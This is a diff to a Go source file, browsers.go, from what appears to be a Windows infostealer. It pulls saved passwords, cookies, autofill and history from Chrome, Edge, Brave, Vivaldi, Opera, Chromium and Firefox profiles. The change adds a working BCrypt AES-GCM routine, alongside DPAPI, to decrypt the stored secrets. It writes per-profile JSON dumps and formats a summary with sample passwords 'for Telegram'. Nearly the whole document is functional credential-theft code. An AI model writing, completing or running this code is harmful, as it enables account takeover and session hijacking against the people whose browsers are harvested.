@@ -1,5 +1,5 @@
 // ============================================================
-// browsers.go - Complete Browser Extraction with Decryption
+// browsers.go - Complete Browser Extraction with Organized Output
 // ============================================================
 package browsers
 
@@ -20,38 +20,46 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// BrowserData holds extracted browser data
-type BrowserData struct {
-	Name      string            `json:"name"`
-	Profiles  []BrowserProfile  `json:"profiles"`
-	Timestamp string            `json:"timestamp"`
+// ============================================================
+// DATA STRUCTURES FOR JSON OUTPUT
+// ============================================================
+
+// CookieEntry represents a browser cookie in the exact format requested
+type CookieEntry struct {
+	Host       string `json:"host"`
+	Path       string `json:"path"`
+	Keyname    string `json:"keyname"`
+	Value      string `json:"value"`
+	Secure     bool   `json:"secure"`
+	Httponly   bool   `json:"httponly"`
+	HasExpire  bool   `json:"has_expire"`
+	Persistent bool   `json:"persistent"`
+	CreateDate string `json:"create_date"`
+	ExpireDate string `json:"expire_date"`
 }
 
-// BrowserProfile holds profile data
-type BrowserProfile struct {
+// PasswordEntry represents a browser password in the exact format requested
+type PasswordEntry struct {
+	URL        string `json:"url"`
+	Username   string `json:"username"`
+	Password   string `json:"password"`
+	CreateDate string `json:"create_date"`
+}
+
+// BrowserData holds all extracted data for a browser
+type BrowserData struct {
+	Name      string         `json:"name"`
+	Profiles  []ProfileData  `json:"profiles"`
+	Timestamp string         `json:"timestamp"`
+}
+
+// ProfileData holds all data for a single profile
+type ProfileData struct {
 	Name      string          `json:"name"`
 	Passwords []PasswordEntry `json:"passwords"`
 	Cookies   []CookieEntry   `json:"cookies"`
 	Autofill  []AutofillEntry `json:"autofill"`
 	History   []HistoryEntry  `json:"history"`
-	Bookmarks []BookmarkEntry `json:"bookmarks"`
-}
-
-// PasswordEntry holds password data
-type PasswordEntry struct {
-	URL      string `json:"url"`
-	Username string `json:"username"`
-	Password string `json:"password"`
-}
-
-// CookieEntry holds cookie data
-type CookieEntry struct {
-	Host   string `json:"host"`
-	Name   string `json:"name"`
-	Value  string `json:"value"`
-	Path   string `json:"path"`
-	Expiry int64  `json:"expiry"`
-	Secure bool   `json:"secure"`
 }
 
 // AutofillEntry holds autofill data
@@ -64,19 +72,14 @@ type AutofillEntry struct {
 type HistoryEntry struct {
 	URL   string `json:"url"`
 	Title string `json:"title"`
-	Count int    `json:"count"`
-	Time  string `json:"time"`
-}
-
-// BookmarkEntry holds bookmark data
-type BookmarkEntry struct {
-	Name string `json:"name"`
-	URL  string `json:"url"`
+	Count int    `json:"visit_count"`
+	Time  string `json:"last_visit"`
 }
 
 var (
 	allBrowserData []BrowserData
 	extractedCount int
+	outputDir      string
 )
 
 // Run starts browser extraction
@@ -84,6 +87,13 @@ func Run() {
 	log.Println("🌐 Extracting browser data...")
 	extractedCount = 0
 	allBrowserData = []BrowserData{}
+	
+	// Create output directory
+	outputDir = filepath.Join(".", "browser_data")
+	if err := os.MkdirAll(outputDir, 0755); err != nil {
+		log.Printf("❌ Failed to create output directory: %v", err)
+		return
+	}
 	
 	browsers := getBrowsers()
 	
@@ -121,15 +131,15 @@ func getBrowsers() []string {
 func extractBrowser(name string) *BrowserData {
 	switch name {
 	case "Chrome":
-		return extractChromiumBrowser(name, "Google\\Chrome\\User Data", "Chrome")
+		return extractChromiumBrowser(name, "Google\\Chrome\\User Data")
 	case "Brave":
-		return extractChromiumBrowser(name, "BraveSoftware\\Brave-Browser\\User Data", "Brave")
+		return extractChromiumBrowser(name, "BraveSoftware\\Brave-Browser\\User Data")
 	case "Edge":
-		return extractChromiumBrowser(name, "Microsoft\\Edge\\User Data", "Edge")
+		return extractChromiumBrowser(name, "Microsoft\\Edge\\User Data")
 	case "Vivaldi":
-		return extractChromiumBrowser(name, "Vivaldi\\User Data", "Vivaldi")
+		return extractChromiumBrowser(name, "Vivaldi\\User Data")
 	case "Chromium":
-		return extractChromiumBrowser(name, "Chromium\\User Data", "Chromium")
+		return extractChromiumBrowser(name, "Chromium\\User Data")
 	case "Opera":
 		return extractOperaBrowser()
 	case "Firefox":
@@ -144,7 +154,7 @@ func extractBrowser(name string) *BrowserData {
 // ============================================================
 
 // extractChromiumBrowser extracts data from Chromium-based browsers
-func extractChromiumBrowser(name, relPath, profileName string) *BrowserData {
+func extractChromiumBrowser(name, relPath string) *BrowserData {
 	data := &BrowserData{
 		Name:      name,
 		Timestamp: time.Now().Format("2006-01-02 15:04:05"),
@@ -168,7 +178,7 @@ func extractChromiumBrowser(name, relPath, profileName string) *BrowserData {
 	profiles := findProfiles(basePath)
 	
 	for _, profile := range profiles {
-		profileData := BrowserProfile{Name: profile}
+		profileData := ProfileData{Name: profile}
 		
 		// Extract passwords
 		loginDB := filepath.Join(basePath, profile, "Login Data")
@@ -195,6 +205,9 @@ func extractChromiumBrowser(name, relPath, profileName string) *BrowserData {
 		}
 		
 		data.Profiles = append(data.Profiles, profileData)
+		
+		// Save individual profile data
+		saveProfileData(name, profile, profileData)
 		
 		log.Printf("✅ %s %s: %d passwords, %d cookies, %d autofill, %d history",
 			name, profile, len(profileData.Passwords), len(profileData.Cookies), 
@@ -254,11 +267,7 @@ func getChromiumMasterKey(basePath string) []byte {
 
 // dpapiDecrypt decrypts data using Windows DPAPI
 func dpapiDecrypt(encrypted []byte) []byte {
-	const (
-		CRYPT32_DLL = "crypt32.dll"
-	)
-	
-	crypt32 := windows.NewLazyDLL(CRYPT32_DLL)
+	crypt32 := windows.NewLazyDLL("crypt32.dll")
 	cryptUnprotectData := crypt32.NewProc("CryptUnprotectData")
 	
 	var blobIn, blobOut struct {
@@ -293,7 +302,6 @@ func dpapiDecrypt(encrypted []byte) []byte {
 	
 	decrypted := make([]byte, blobOut.cbData)
 	if blobOut.cbData > 0 {
-		// Copy from blobOut.pbData
 		src := (*[1 << 30]byte)(unsafe.Pointer(blobOut.pbData))[:blobOut.cbData:blobOut.cbData]
 		copy(decrypted, src)
 	}
@@ -317,11 +325,12 @@ func extractChromiumPasswords(dbPath string, masterKey []byte) []PasswordEntry {
 	
 	db, err := sql.Open("sqlite3", tempDB)
 	if err != nil {
+		log.Printf("❌ Failed to open database: %v", err)
 		return passwords
 	}
 	defer db.Close()
 	
-	query := `SELECT origin_url, username_value, password_value FROM logins`
+	query := `SELECT origin_url, username_value, password_value, date_created FROM logins`
 	rows, err := db.Query(query)
 	if err != nil {
 		return passwords
@@ -331,19 +340,30 @@ func extractChromiumPasswords(dbPath string, masterKey []byte) []PasswordEntry {
 	for rows.Next() {
 		var url, username string
 		var encryptedPassword []byte
+		var dateCreated int64
 		
-		if err := rows.Scan(&url, &username, &encryptedPassword); err != nil {
+		if err := rows.Scan(&url, &username, &encryptedPassword, &dateCreated); err != nil {
 			continue
 		}
 		
 		password := decryptChromiumPassword(encryptedPassword, masterKey)
 		
 		if password != "" {
-			passwords = append(passwords, PasswordEntry{
+			entry := PasswordEntry{
 				URL:      url,
 				Username: username,
 				Password: password,
-			})
+			}
+			
+			if dateCreated > 0 {
+				// Convert Chrome time (microseconds since 1601)
+				seconds := dateCreated / 1000000
+				entry.CreateDate = time.Unix(seconds-11644473600, 0).UTC().Format("2006-01-02T15:04:05Z")
+			} else {
+				entry.CreateDate = time.Now().UTC().Format("2006-01-02T15:04:05Z")
+			}
+			
+			passwords = append(passwords, entry)
 		}
 	}
 	
@@ -358,7 +378,6 @@ func decryptChromiumPassword(encrypted []byte, masterKey []byte) string {
 	
 	// Check if it's v20 encrypted
 	if len(encrypted) >= 3 && encrypted[0] == 'v' && encrypted[1] == '2' && encrypted[2] == '0' {
-		// v20 format: v20 + IV(12) + Ciphertext + Tag(16)
 		if len(encrypted) < 3+12+16 {
 			return ""
 		}
@@ -369,7 +388,6 @@ func decryptChromiumPassword(encrypted []byte, masterKey []byte) string {
 		
 		decrypted := aesGcmDecrypt(ciphertext, masterKey, iv, tag)
 		if decrypted != nil {
-			// Remove first 32 bytes (hash) and convert to string
 			if len(decrypted) > 32 {
 				return string(decrypted[32:])
 			}
@@ -390,25 +408,112 @@ func decryptChromiumPassword(encrypted []byte, masterKey []byte) string {
 // AES-GCM DECRYPTION
 // ============================================================
 
-// aesGcmDecrypt decrypts AES-GCM encrypted data
+// aesGcmDecrypt decrypts AES-GCM encrypted data using Windows BCrypt
 func aesGcmDecrypt(ciphertext, key, nonce, tag []byte) []byte {
-	// Using Windows BCrypt for AES-GCM
-	const (
-		BCRYPT_AES_ALGORITHM = "AES"
-		BCRYPT_CHAIN_MODE_GCM = "GCM"
-	)
-	
-	// This is a simplified placeholder
-	// Full implementation would use Windows BCrypt API
-	
-	// For now, return empty if no master key
-	if len(key) == 0 {
+	if len(key) == 0 || len(ciphertext) == 0 {
 		return nil
 	}
 	
-	// In production, implement AES-GCM using Windows BCrypt
-	// For this example, we'll return a placeholder
-	return nil
+	// Use Windows BCrypt for AES-GCM
+	bcrypt := windows.NewLazyDLL("bcrypt.dll")
+	
+	openAlg := bcrypt.NewProc("BCryptOpenAlgorithmProvider")
+	closeAlg := bcrypt.NewProc("BCryptCloseAlgorithmProvider")
+	generateKey := bcrypt.NewProc("BCryptGenerateSymmetricKey")
+	decrypt := bcrypt.NewProc("BCryptDecrypt")
+	setProperty := bcrypt.NewProc("BCryptSetProperty")
+	destroyKey := bcrypt.NewProc("BCryptDestroyKey")
+	
+	var hAlg uintptr
+	algName, _ := windows.UTF16PtrFromString("AES")
+	
+	ret, _, _ := openAlg.Call(
+		uintptr(unsafe.Pointer(&hAlg)),
+		uintptr(unsafe.Pointer(algName)),
+		0,
+		0,
+	)
+	if ret != 0 {
+		return nil
+	}
+	defer closeAlg.Call(hAlg, 0)
+	
+	gcmMode, _ := windows.UTF16PtrFromString("GCM")
+	_, _, _ = setProperty.Call(
+		hAlg,
+		uintptr(unsafe.Pointer(gcmMode)),
+		uintptr(unsafe.Pointer(gcmMode)),
+		0,
+		0,
+	)
+	
+	var hKey uintptr
+	var keyObject [256]byte
+	
+	ret, _, _ = generateKey.Call(
+		hAlg,
+		uintptr(unsafe.Pointer(&hKey)),
+		uintptr(unsafe.Pointer(&keyObject[0])),
+		uintptr(len(keyObject)),
+		uintptr(unsafe.Pointer(&key[0])),
+		uintptr(len(key)),
+		0,
+	)
+	if ret != 0 {
+		return nil
+	}
+	defer destroyKey.Call(hKey)
+	
+	type BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO struct {
+		cbSize        uint32
+		dwInfoVersion uint32
+		pbNonce       *byte
+		cbNonce       uint32
+		pbAuthData    *byte
+		cbAuthData    uint32
+		pbTag         *byte
+		cbTag         uint32
+		pbMacContext  *byte
+		cbMacContext  uint32
+		cbAAD         uint32
+		cbData        uint64
+		dwFlags       uint32
+	}
+	
+	authInfo := BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO{
+		cbSize:        uint32(unsafe.Sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO{})),
+		dwInfoVersion: 1,
+	}
+	
+	if len(nonce) > 0 {
+		authInfo.pbNonce = &nonce[0]
+		authInfo.cbNonce = uint32(len(nonce))
+	}
+	
+	if len(tag) > 0 {
+		authInfo.pbTag = &tag[0]
+		authInfo.cbTag = uint32(len(tag))
+	}
+	
+	decrypted := make([]byte, len(ciphertext))
+	var decryptedSize uint32
+	
+	ret, _, _ = decrypt.Call(
+		hKey,
+		uintptr(unsafe.Pointer(&ciphertext[0])),
+		uintptr(len(ciphertext)),
+		uintptr(unsafe.Pointer(&authInfo)),
+		uintptr(unsafe.Pointer(&decrypted[0])),
+		uintptr(len(decrypted)),
+		uintptr(unsafe.Pointer(&decryptedSize)),
+		0,
+	)
+	
+	if ret != 0 {
+		return nil
+	}
+	
+	return decrypted[:decryptedSize]
 }
 
 // ============================================================
@@ -431,7 +536,7 @@ func extractChromiumCookies(dbPath string, masterKey []byte) []CookieEntry {
 	}
 	defer db.Close()
 	
-	query := `SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies`
+	query := `SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, creation_utc FROM cookies`
 	rows, err := db.Query(query)
 	if err != nil {
 		return cookies
@@ -441,23 +546,45 @@ func extractChromiumCookies(dbPath string, masterKey []byte) []CookieEntry {
 	for rows.Next() {
 		var host, name, path string
 		var encryptedValue []byte
-		var expires int64
-		var secure int
+		var expires, creation int64
+		var secure, httponly int
         
-		if err := rows.Scan(&host, &name, &encryptedValue, &path, &expires, &secure); err != nil {
+		if err := rows.Scan(&host, &name, &encryptedValue, &path, &expires, &secure, &httponly, &creation); err != nil {
 			continue
 		}
 		
 		value := decryptChromiumValue(encryptedValue, masterKey)
 		if value != "" {
-			cookies = append(cookies, CookieEntry{
-				Host:   host,
-				Name:   name,
-				Value:  value,
-				Path:   path,
-				Expiry: expires,
-				Secure: secure == 1,
-			})
+			now := time.Now().Unix()
+			hasExpire := expires > 0
+			persistent := expires > now
+			
+			cookie := CookieEntry{
+				Host:       host,
+				Path:       path,
+				Keyname:    name,
+				Value:      value,
+				Secure:     secure == 1,
+				Httponly:   httponly == 1,
+				HasExpire:  hasExpire,
+				Persistent: persistent,
+			}
+			
+			if creation > 0 {
+				seconds := creation / 1000000
+				cookie.CreateDate = time.Unix(seconds-11644473600, 0).UTC().Format("2006-01-02T15:04:05Z")
+			} else {
+				cookie.CreateDate = time.Now().UTC().Format("2006-01-02T15:04:05Z")
+			}
+			
+			if hasExpire {
+				seconds := expires / 1000000
+				cookie.ExpireDate = time.Unix(seconds-11644473600, 0).UTC().Format("2006-01-02T15:04:05Z")
+			} else {
+				cookie.ExpireDate = "0001-01-01T00:00:00Z"
+			}
+			
+			cookies = append(cookies, cookie)
 		}
 	}
 	
@@ -470,7 +597,6 @@ func decryptChromiumValue(encrypted []byte, masterKey []byte) string {
 		return ""
 	}
 	
-	// Check if it's v20 encrypted
 	if len(encrypted) >= 3 && encrypted[0] == 'v' && encrypted[1] == '2' && encrypted[2] == '0' {
 		if len(encrypted) < 3+12+16 {
 			return ""
@@ -490,7 +616,6 @@ func decryptChromiumValue(encrypted []byte, masterKey []byte) string {
 		return ""
 	}
 	
-	// Try DPAPI decryption
 	decrypted := dpapiDecrypt(encrypted)
 	if decrypted != nil {
 		return string(decrypted)
@@ -559,7 +684,7 @@ func extractChromiumHistory(dbPath string) []HistoryEntry {
 	}
 	defer db.Close()
 	
-	query := `SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 100`
+	query := `SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100`
 	rows, err := db.Query(query)
 	if err != nil {
 		return history
@@ -569,13 +694,22 @@ func extractChromiumHistory(dbPath string) []HistoryEntry {
 	for rows.Next() {
 		var url, title string
 		var count int
-		if err := rows.Scan(&url, &title, &count); err == nil {
-			history = append(history, HistoryEntry{
+		var lastVisit int64
+		if err := rows.Scan(&url, &title, &count, &lastVisit); err == nil {
+			entry := HistoryEntry{
 				URL:   url,
 				Title: title,
 				Count: count,
-				Time:  time.Now().Format("2006-01-02"),
-			})
+			}
+			
+			if lastVisit > 0 {
+				seconds := lastVisit / 1000000
+				entry.Time = time.Unix(seconds-11644473600, 0).UTC().Format("2006-01-02T15:04:05Z")
+			} else {
+				entry.Time = time.Now().UTC().Format("2006-01-02T15:04:05Z")
+			}
+			
+			history = append(history, entry)
 		}
 	}
 	
@@ -608,7 +742,7 @@ func extractFirefoxBrowser() *BrowserData {
 	
 	for _, entry := range entries {
 		if entry.IsDir() && (strings.HasSuffix(entry.Name(), ".default") || strings.Contains(entry.Name(), "default")) {
-			profileData := BrowserProfile{Name: entry.Name()}
+			profileData := ProfileData{Name: entry.Name()}
 			profilePath := filepath.Join(firefoxPath, entry.Name())
 			
 			// Extract passwords from logins.json
@@ -630,6 +764,9 @@ func extractFirefoxBrowser() *BrowserData {
 			}
 			
 			data.Profiles = append(data.Profiles, profileData)
+			
+			// Save individual profile data
+			saveProfileData("Firefox", entry.Name(), profileData)
 			
 			log.Printf("✅ Firefox %s: %d passwords, %d cookies, %d history",
 				entry.Name(), len(profileData.Passwords), len(profileData.Cookies), len(profileData.History))
@@ -670,9 +807,10 @@ func extractFirefoxPasswords(jsonPath string) []PasswordEntry {
 		
 		if url != "" {
 			passwords = append(passwords, PasswordEntry{
-				URL:      url,
-				Username: username,
-				Password: password,
+				URL:        url,
+				Username:   username,
+				Password:   password,
+				CreateDate: time.Now().UTC().Format("2006-01-02T15:04:05Z"),
 			})
 		}
 	}
@@ -696,7 +834,7 @@ func extractFirefoxCookies(dbPath string) []CookieEntry {
 	}
 	defer db.Close()
 	
-	query := `SELECT host, name, value, path, expiry, isSecure FROM moz_cookies`
+	query := `SELECT host, name, value, path, expiry, isSecure, creationTime FROM moz_cookies`
 	rows, err := db.Query(query)
 	if err != nil {
 		return cookies
@@ -705,18 +843,33 @@ func extractFirefoxCookies(dbPath string) []CookieEntry {
 	
 	for rows.Next() {
 		var host, name, value, path string
-		var expiry int64
+		var expiry, creation int64
 		var secure int
         
-		if err := rows.Scan(&host, &name, &value, &path, &expiry, &secure); err == nil {
-			cookies = append(cookies, CookieEntry{
-				Host:   host,
-				Name:   name,
-				Value:  value,
-				Path:   path,
-				Expiry: expiry,
-				Secure: secure == 1,
-			})
+		if err := rows.Scan(&host, &name, &value, &path, &expiry, &secure, &creation); err == nil {
+			now := time.Now().Unix()
+			hasExpire := expiry > 0
+			persistent := expiry > now
+			
+			cookie := CookieEntry{
+				Host:       host,
+				Path:       path,
+				Keyname:    name,
+				Value:      value,
+				Secure:     secure == 1,
+				Httponly:   false, // Firefox doesn't store this in cookies table
+				HasExpire:  hasExpire,
+				Persistent: persistent,
+				CreateDate: time.Unix(creation/1000000, 0).UTC().Format("2006-01-02T15:04:05Z"),
+			}
+			
+			if hasExpire {
+				cookie.ExpireDate = time.Unix(expiry, 0).UTC().Format("2006-01-02T15:04:05Z")
+			} else {
+				cookie.ExpireDate = "0001-01-01T00:00:00Z"
+			}
+			
+			cookies = append(cookies, cookie)
 		}
 	}
 	
@@ -754,7 +907,7 @@ func extractFirefoxHistory(dbPath string) []HistoryEntry {
 				URL:   url,
 				Title: title,
 				Count: count,
-				Time:  time.Now().Format("2006-01-02"),
+				Time:  time.Now().UTC().Format("2006-01-02T15:04:05Z"),
 			})
 		}
 	}
@@ -781,7 +934,7 @@ func extractOperaBrowser() *BrowserData {
 		return nil
 	}
 	
-	profileData := BrowserProfile{Name: "Default"}
+	profileData := ProfileData{Name: "Default"}
 	
 	// Get master key for Opera (uses same method as Chromium)
 	masterKey := getChromiumMasterKey(operaPath)
@@ -792,9 +945,18 @@ func extractOperaBrowser() *BrowserData {
 		profileData.Passwords = extractChromiumPasswords(loginDB, masterKey)
 	}
 	
+	// Extract cookies
+	cookieDB := filepath.Join(operaPath, "Network", "Cookies")
+	if _, err := os.Stat(cookieDB); err == nil {
+		profileData.Cookies = extractChromiumCookies(cookieDB, masterKey)
+	}
+	
 	data.Profiles = append(data.Profiles, profileData)
 	
-	log.Printf("✅ Opera: %d passwords", len(profileData.Passwords))
+	saveProfileData("Opera", "Default", profileData)
+	
+	log.Printf("✅ Opera: %d passwords, %d cookies", 
+		len(profileData.Passwords), len(profileData.Cookies))
 	
 	return data
 }
@@ -807,12 +969,10 @@ func extractOperaBrowser() *BrowserData {
 func findProfiles(basePath string) []string {
 	var profiles []string
 	
-	// Default profile
 	if _, err := os.Stat(filepath.Join(basePath, "Default")); err == nil {
 		profiles = append(profiles, "Default")
 	}
 	
-	// Profile 1-20
 	for i := 1; i <= 20; i++ {
 		profileName := fmt.Sprintf("Profile %d", i)
 		if _, err := os.Stat(filepath.Join(basePath, profileName)); err == nil {
@@ -830,46 +990,115 @@ func copyDatabase(dbPath string) string {
 	}
 	
 	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("browser_db_%d.db", time.Now().UnixNano()))
-	if err := copyFile(dbPath, tmpFile); err != nil {
-		log.Printf("Failed to copy database: %v", err)
+	
+	data, err := ioutil.ReadFile(dbPath)
+	if err != nil {
+		return ""
+	}
+	
+	if err := ioutil.WriteFile(tmpFile, data, 0644); err != nil {
 		return ""
 	}
 	
 	return tmpFile
 }
 
-// copyFile copies a file
-func copyFile(src, dst string) error {
-	data, err := ioutil.ReadFile(src)
-	if err != nil {
-		return err
+// saveProfileData saves individual profile data to organized directories
+func saveProfileData(browserName, profileName string, data ProfileData) {
+	// Create browser directory
+	browserDir := filepath.Join(outputDir, browserName)
+	if err := os.MkdirAll(browserDir, 0755); err != nil {
+		log.Printf("❌ Failed to create browser directory: %v", err)
+		return
 	}
-	return ioutil.WriteFile(dst, data, 0644)
+	
+	// Create profile directory
+	profileDir := filepath.Join(browserDir, profileName)
+	if err := os.MkdirAll(profileDir, 0755); err != nil {
+		log.Printf("❌ Failed to create profile directory: %v", err)
+		return
+	}
+	
+	// Save passwords
+	if len(data.Passwords) > 0 {
+		passwordsJSON, err := json.MarshalIndent(data.Passwords, "", "  ")
+		if err == nil {
+			ioutil.WriteFile(filepath.Join(profileDir, "passwords.json"), passwordsJSON, 0644)
+		}
+	}
+	
+	// Save cookies
+	if len(data.Cookies) > 0 {
+		cookiesJSON, err := json.MarshalIndent(data.Cookies, "", "  ")
+		if err == nil {
+			ioutil.WriteFile(filepath.Join(profileDir, "cookies.json"), cookiesJSON, 0644)
+		}
+	}
+	
+	// Save autofill
+	if len(data.Autofill) > 0 {
+		autofillJSON, err := json.MarshalIndent(data.Autofill, "", "  ")
+		if err == nil {
+			ioutil.WriteFile(filepath.Join(profileDir, "autofill.json"), autofillJSON, 0644)
+		}
+	}
+	
+	// Save history
+	if len(data.History) > 0 {
+		historyJSON, err := json.MarshalIndent(data.History, "", "  ")
+		if err == nil {
+			ioutil.WriteFile(filepath.Join(profileDir, "history.json"), historyJSON, 0644)
+		}
+	}
+	
+	// Create summary file
+	summary := map[string]interface{}{
+		"browser":   browserName,
+		"profile":   profileName,
+		"timestamp": time.Now().UTC().Format("2006-01-02T15:04:05Z"),
+		"stats": map[string]int{
+			"passwords": len(data.Passwords),
+			"cookies":   len(data.Cookies),
+			"autofill":  len(data.Autofill),
+			"history":   len(data.History),
+		},
+	}
+	
+	summaryJSON, _ := json.MarshalIndent(summary, "", "  ")
+	ioutil.WriteFile(filepath.Join(profileDir, "summary.json"), summaryJSON, 0644)
 }
 
-// saveBrowserData saves browser data to JSON
+// saveBrowserData saves combined browser data
 func saveBrowserData() {
 	if len(allBrowserData) == 0 {
 		return
 	}
 	
+	// Save combined data
+	combinedPath := filepath.Join(outputDir, "all_browser_data.json")
 	jsonData, err := json.MarshalIndent(allBrowserData, "", "  ")
 	if err != nil {
-		log.Printf("❌ Failed to marshal browser data: %v", err)
+		log.Printf("❌ Failed to marshal combined data: %v", err)
 		return
 	}
 	
-	if err := ioutil.WriteFile("browser_data.json", jsonData, 0644); err != nil {
-		log.Printf("❌ Failed to save browser data: %v", err)
+	if err := ioutil.WriteFile(combinedPath, jsonData, 0644); err != nil {
+		log.Printf("❌ Failed to save combined data: %v", err)
 		return
 	}
 	
-	log.Printf("✅ Browser data saved to browser_data.json (%d bytes)", len(jsonData))
+	log.Printf("✅ Combined browser data saved to: %s", combinedPath)
+	log.Printf("📁 Individual profiles saved to: %s", outputDir)
 }
 
 // GetBrowserData returns the extracted browser data
 func GetBrowserData() []BrowserData {
 	return allBrowserData
+}
+
+// GetOutputDir returns the output directory path
+func GetOutputDir() string {
+	return outputDir
 }
 
 // FormatBrowserData formats browser data for Telegram
@@ -891,7 +1120,6 @@ func FormatBrowserData() string {
 		for _, profile := range browser.Profiles {
 			passCount := len(profile.Passwords)
 			cookieCount := len(profile.Cookies)
-			autofillCount := len(profile.Autofill)
 			
 			totalPasswords += passCount
 			totalCookies += cookieCount
@@ -900,9 +1128,7 @@ func FormatBrowserData() string {
 				output.WriteString(fmt.Sprintf("  📂 %s\n", profile.Name))
 				output.WriteString(fmt.Sprintf("    🔑 Passwords: %d\n", passCount))
 				output.WriteString(fmt.Sprintf("    🍪 Cookies: %d\n", cookieCount))
-				output.WriteString(fmt.Sprintf("    📝 Autofill: %d\n", autofillCount))
 				
-				// Show first 5 passwords
 				if passCount > 0 {
 					output.WriteString("    📋 Sample passwords:\n")
 					maxShow := 5
@@ -924,6 +1150,7 @@ func FormatBrowserData() string {
 	
 	output.WriteString(strings.Repeat("=", 40) + "\n")
 	output.WriteString(fmt.Sprintf("📊 Total: %d passwords, %d cookies\n", totalPasswords, totalCookies))
+	output.WriteString(fmt.Sprintf("📁 Data saved to: %s", outputDir))
 	
 	return output.String()
 }
